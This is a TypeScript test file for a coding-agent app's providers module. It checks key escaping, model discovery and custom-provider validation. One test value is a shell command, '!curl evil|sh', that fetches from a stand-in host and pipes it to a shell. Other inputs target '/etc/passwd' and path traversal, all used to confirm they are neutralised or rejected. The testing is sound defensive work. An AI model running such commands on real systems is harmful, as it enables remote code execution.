import { mkdtempSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { ModelRuntime } from "@earendil-works/pi-coding-agent";
import { expect, test } from "vitest";
import { findModels, listProviders, literalKey, mergeProvider, validateCustomProvider } from "./providers";
import type { CustomProvider } from "#protocol";

test("a typed key stays a literal in models.json (no command, no environment variable)", () => {
  expect(literalKey("sk-abc")).toBe("sk-abc");
  expect(literalKey("a$b")).toBe("a$$b");
  expect(literalKey("!curl evil|sh")).toBe("$!curl evil|sh");
  expect(literalKey("$ANTHROPIC_API_KEY")).toBe("$$ANTHROPIC_API_KEY");
});

test("the providers table still shows when models.json has comments, which pi accepts", () => {
  const dir = mkdtempSync(join(tmpdir(), "tenon-providers-"));
  writeFileSync(join(dir, "models.json"), '{\n  // my local server\n  "providers": { "local": {} }\n}');
  const before = process.env.PI_CODING_AGENT_DIR;
  process.env.PI_CODING_AGENT_DIR = dir;
  // A partial runtime: listProviders reads only these members.
  const rt = {
    getAvailableSnapshot: () => [],
    getProviders: () => [{ id: "local", name: "Local", auth: {}, baseUrl: "http://127.0.0.1:8080", getModels: () => [] }],
    getProviderAuthStatus: () => ({ configured: false, source: undefined }),
    isUsingSubscription: () => false,
    getRegisteredProviderConfig: () => undefined,
  } as unknown as ModelRuntime;
  try {
    expect(listProviders(rt)).toMatchObject([{ id: "local", custom: false }]);
  } finally {
    if (before === undefined) delete process.env.PI_CODING_AGENT_DIR;
    else process.env.PI_CODING_AGENT_DIR = before;
  }
});

test("find models: an OpenAI-style /models list, with context and embeddings marked", async () => {
  let auth: string | undefined;
  const server = createServer((req, res) => {
    auth = req.headers.authorization;
    res.end(JSON.stringify({ data: [{ id: "qwen3-coder-30b", context_length: 131072 }, { id: "nomic-embed-text" }] }));
  });
  await new Promise<void>((r) => server.listen(0, r));
  const url = `http://127.0.0.1:${(server.address() as AddressInfo).port}/v1/`;
  try {
    expect(await findModels(url, "openai-completions", "sk-test")).toEqual([
      { id: "qwen3-coder-30b", contextWindow: 131072, embeddings: false },
      { id: "nomic-embed-text", contextWindow: undefined, embeddings: true },
    ]);
    expect(auth).toBe("Bearer sk-test");
    await expect(findModels("file:///etc/passwd", "openai-completions")).rejects.toThrow("http");
  } finally {
    server.close();
  }
});

const provider = (over: Partial<CustomProvider> = {}): CustomProvider => ({
  name: "local", baseUrl: "http://127.0.0.1:1234/v1", api: "openai-completions", models: [{ id: "qwen" }], ...over,
});

test("a custom provider from the window must pass each check", () => {
  expect(() => validateCustomProvider(provider())).not.toThrow();
  expect(() => validateCustomProvider(provider({ name: "../x" }))).toThrow("name");
  expect(() => validateCustomProvider(provider({ baseUrl: "file:///etc" }))).toThrow("base URL");
  expect(() => validateCustomProvider(provider({ api: "grpc" }))).toThrow("APIs");
  expect(() => validateCustomProvider(provider({ models: [] }))).toThrow("at least one model");
  expect(() => validateCustomProvider(provider({ models: [{ id: "x".repeat(201) }] }))).toThrow("at least one model");
  expect(() => validateCustomProvider(provider({ models: [{ id: "q", contextWindow: 1.5 }] }))).toThrow("whole number");
  expect(() => validateCustomProvider(provider({ apiKey: "k".repeat(4001) }))).toThrow("key");
});

test("a merged provider keeps its other fields, its other models, and its key when none is given", () => {
  const old = { headers: { a: "1" }, apiKey: "old-key", models: [{ id: "qwen" }, { id: "llama" }] };
  expect(mergeProvider(old, provider({ models: [{ id: "qwen", contextWindow: 8192 }] }))).toEqual({
    headers: { a: "1" }, baseUrl: "http://127.0.0.1:1234/v1", api: "openai-completions", apiKey: "old-key",
    models: [{ id: "llama" }, { id: "qwen", contextWindow: 8192 }],
  });
  expect(mergeProvider({}, provider()).apiKey).toBe("none"); // a keyless local server still needs some key
  expect(mergeProvider(old, provider({ apiKey: " $NEW " })).apiKey).toBe("$$NEW"); // a typed key is a literal
});
